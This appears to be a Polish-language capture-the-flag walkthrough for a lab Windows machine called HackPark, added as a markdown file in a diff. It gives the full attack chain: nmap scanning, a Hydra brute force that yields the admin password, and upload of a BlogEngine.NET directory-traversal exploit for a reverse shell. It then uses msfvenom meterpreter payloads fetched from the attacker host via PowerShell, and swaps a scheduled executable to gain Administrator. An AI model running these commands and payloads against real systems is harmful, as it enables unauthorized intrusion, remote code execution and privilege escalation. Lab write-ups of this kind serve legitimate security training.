@@ -1,0 +1,327 @@
+Windows - reverse_tcp
+
+### Zadanie 1:
+
+*Enumeracja za pomoca nmap:*
+```python
+sudo nmap -sC -sV -A -Pn 10.10.221.210 
+
+
+Nmap scan report for 10.10.221.210
+Host is up (0.092s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+|_http-title: hackpark | hackpark amusements
+|_http-server-header: Microsoft-IIS/8.5
+3389/tcp open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|_  System_Time: 2022-09-24T07:27:45+00:00
+|_ssl-date: 2022-09-24T07:27:46+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2022-09-23T07:22:00
+|_Not valid after:  2023-03-25T07:22:00
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (98%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 (98%), Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   47.92 ms 10.18.0.1
+2   49.59 ms 10.10.221.210
+```
+
+*Istnieje serwer WWW działający na porcie 80/tcp.
+W przeglądarce:*
+```python
+http://10.10.221.210
+```
+
+Zdjecie należy przesłać do wyszukiwarki obrazów Goole.
+Imie Klowna to:
+pennywise
+
+### Zadanie 2:
+
+*W przeglądarce należy przejść do strony logowania:*
+```python
+http://10.10.221.210/Account/login.aspx?ReturnURL=/admin/
+```
+
+
+*Sprawdzenie z jakiej metody korzsyta formularz:*
+```python
+curl -s http://10.10.221.210/Account/login.aspx?ReturnURL=/admin/ | grep "<form"                                                                     1 ⨯
+Wynik:    
+<form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
+```
+
+Formularz korzysta z metody Post.
+
+**Można również użyc BurpSuit.**
+
+*Teraz należy złamać hasło użytkownika admin:*
+```python
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.221.210 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=bbKmJ9xxHdEFSouZb%2FJt114g7kbCU%2BaAQwAIi4deqUFdDc2%2BDOyfhbxPK%2B%2BNIs0jqf%2FsVfEDjsUlyqNHfV9qvtxjqKI%2Bxk0hB92SHyd%2FrMv8lSkz39MnOgI%2FZTUf8MkHtfySJo6nuN%2BfIreenhyC74kh2wscnkRKMUtwStKAYClr9zwW&__EVENTVALIDATION=HBnWUtjmHn9931oNnDtG22SHpD0NpHECaRk84HSrl2D8YcWVS9rjv5ZaHkUBaawrBI4SEK67XCSEm4PrceIrvncRurdqS7hnGAOprTQOqVT%2BCYiaQQdwX5Btmf1e3LIh%2BEAFsXzTN5jJFUTpssnZJ6jYywchAMPdrLGCkPjibCwERDvH&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=failed"
+``` 
+
+
+*Hasło zostało złamane:*
+host: 10.10.221.210   login: admin   password: 1qaz2wsx
+
+
+### Zadanie 3:
+
+*W tym momencie należy zalogować się na konto admina:*
+login: admin
+password: 1qaz2wsx
+
+*Wersja BlogEngine to:*
+Version: 3.3.6.0 
+
+
+*Szukanie exploita:*
+searchsploit blogengine 3.3.6 remote
+```python
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                         | aspx/webapps/46353.cs
+BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                         | aspx/webapps/47010.py
+BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                    | aspx/webapps/47011.py
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+
+*Próba z pierwszym exploitem:*
+```python
+searchsploit -x 46353
+```
+
+*Szczegóły exploita pokazują CVE:*
+CVE-2019–6714
+
+Instrukcja w komentarzu:
+First, we set the TcpClient address and port within the method below to our attack host, who has a reverse tcp listener. 
+Next, we upload this file ... as PostView.ascx. The admin page that allows upload is: http://10.10.10.10/admin/app/editor/editpost.cshtml
+Finally, the vulnerability is triggered by accessing ... http://10.10.10.10/?theme=../../App_Data/files
+
+
+*Teraz należy skopiować ten skrypt:*
+```python
+cp /usr/share/exploitdb/exploits/aspx/webapps/46353.cs PostView.ascx
+```
+
+*Ustawienie hosta i portu w linii 51 na żądany port:*
+```python
+using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("IP Kali Linux", 4445)) {
+```
+
+*Przesłanie skryptu:*
+```python
+http://10.10.221.210/admin/app/editor/editpost.cshtml
+```
+
+*W file manager należy:*
+```python
+upload
+```
+
+*Kali Linux:*
+```python
+nc -lvnp 4445
+```
+
+*W przeglądarce:*
+```python
+http://10.10.221.210/?theme=../../App_Data/files
+```
+
+**Połączenie zostało nawiązane.**
+
+
+### Zadanie 4:
+**Ulepszanie powłoki**
+Należy wykonać kolejną odwrotną powłokę:
+
+
+*Kali Linux:*
+Generowanie plku wykonywalnego:
+```python
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.105.140 LPORT=2345 -f exe -o revshell.exe
+```
+
+*Kali LInux:*
+```python
+python3 -m http.server
+```
+
+*Target:*
+```python
+powershell -c "Invoke-WebRequest -Uri 'http://10.18.105.140:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+lub
+powershell -c wget "http://10.9.202.151:8000/reverse.exe" -outfile "reverse.exe"
+```
+
+*Wejsc do folderu:*
+```python
+C:\Temp
+.\revshell.exe
+```
+
+*Metasploitable*
+```python
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.18.105.140
+set LPORT 2345
+run
+```
+
+```python
+cd SystemScheduler\events
+cat 20198415519.INI_LOG.txt
+```
+
+Z dzienników WindowsScheduler widać Message.exe, że jest wykonywany co około 30 sekund jako administrator. Można skorzystać z tego, aby zastąpić odwrotną powłoką, aby była wykonywana jako adminstrator. 
+
+*Kali Linux:*
+```python
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.105.140 LPORT=3456 -f exe -o Message.exe
+```
+
+```python
+python3 -m http.server
+```
+
+*W meterpreter:*
+```python
+shell
+powershell -c "Invoke-WebRequest -Uri 'http://10.18.105.140:8000/Message.exe' -OutFile 'c:\windows\temp\Message.exe'"
+.\Message.exe
+```
+
+*Plik umieścić w:* 
+```python
+C:\Program Files (x86)\SystemScheduler\
+
+cp Message.exe "C:\Program Files (x86)\SystemScheduler\Message.exe"
+
+Otworzyć nowego metasploita:
+Skonfigurować program obsługi TCP:
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.18.105.140
+set LPORT 3456
+run
+
+getuid
+Server username: HACKPARK\Administrator
+
+cd C:\Users\jeff\Desktop
+cat user.txt
+Flaga:
+759bd8af507517bcfaede78a21a73e39
+
+cd C:\users\administrator\desktop
+cat root.txt
+Flaga:
+7e13d97f05f7ceb9881a3eb3d78d3e72
+```
+
+
+### Zadanie 5:
+
+*Ponowne zalogowanie na stronie:*
+```python
+http://10.10.58.149/Account/login.aspx?ReturnURL=/admin/
+login: admin   password: 1qaz2wsx
+```
+
+*Teraz na nowo należy stawić hosta i port w linii 51 na żądany port:*
+```python
+using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("IP Kali Linux", 4445)) {
+```
+
+*Przesłanie skryptu:*
+```python
+http://10.10.58.149/admin/app/editor/editpost.cshtml
+```
+
+*W file manager należy:*
+```python
+upload
+```
+
+*Kali Linux:*
+```python
+nc -lvnp 4445
+```
+
+*W przeglądarce:*
+```python
+http://10.10.58.149/?theme=../../App_Data/files
+```
+
+**Połączenie zostało nawiązane.**
+
+
+*Kali LInux:*
+```python
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe -o reverse.exe
+```
+
+*Kali Linux:*
+```python
+nc -lnvp $lport
+```
+
+*Użycie winPEAS*
+```python
+git clone https://github.com/carlospolop/PEASS-ng
+```
+
+*Target:*
+```python
+shell
+powershell -c "Invoke-WebRequest -Uri 'http://10.18.105.140:8000/winPEAS.bat' -OutFile 'c:\windows\temp\winPEAS.bat'"
+.\winPEAS.bat
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check for vulnerabilities for the OS version with the applied patches
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-10000-00000-AA228
+Original Install Date:     8/3/2019, 10:43:23 AM
+```
